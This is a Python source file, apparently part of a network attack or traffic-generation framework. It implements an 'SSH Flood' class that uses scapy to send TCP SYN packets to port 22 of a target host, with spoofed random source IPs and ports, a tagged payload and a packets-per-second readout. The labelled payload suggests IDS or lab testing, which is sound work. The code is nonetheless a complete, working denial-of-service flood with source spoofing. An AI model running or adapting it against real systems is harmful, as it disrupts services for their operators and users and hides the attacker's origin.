"""
SSH Flood Attack
"""
from scapy.all import IP, TCP, Raw
import time
import random
from datetime import datetime
from .base_attack import BaseAttack
from utils.network_utils import generate_random_ip, generate_random_port


class SSHAttack(BaseAttack):
    """SSH SYN Flood med identifierbar payload"""

    def get_attack_name(self):
        return "SSH Flood"

    def execute(self, count=100):
        """Kör SSH flood attack"""
        self.print_header("SSH Flood Attack", port=22, count=count)

        self.start_time = time.time()
        self.packets_sent = 0

        for i in range(count):
            fake_source = generate_random_ip()
            fake_sport = generate_random_port()
            timestamp = datetime.now().strftime("%H:%M:%S")
            payload = f"[{timestamp}] {self.custom_message}_SSH_ATTACK_PKT_{i+1}".encode()

            packet = IP(src=fake_source, dst=self.target_ip)/ \
                     TCP(sport=fake_sport, dport=22, flags="S",
                         seq=random.randint(1000, 9000))/ \
                     Raw(load=payload)

            self.send_packet(packet)

            if (i + 1) % 50 == 0:
                elapsed = time.time() - self.start_time
                pps = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"[+] SSH: {i + 1}/{count} paket skickade ({pps:.1f} pps)")

        self.log_attack("SSH_FLOOD", f"{count} packets sent to port 22 with message: {self.custom_message}")
        self.print_summary()
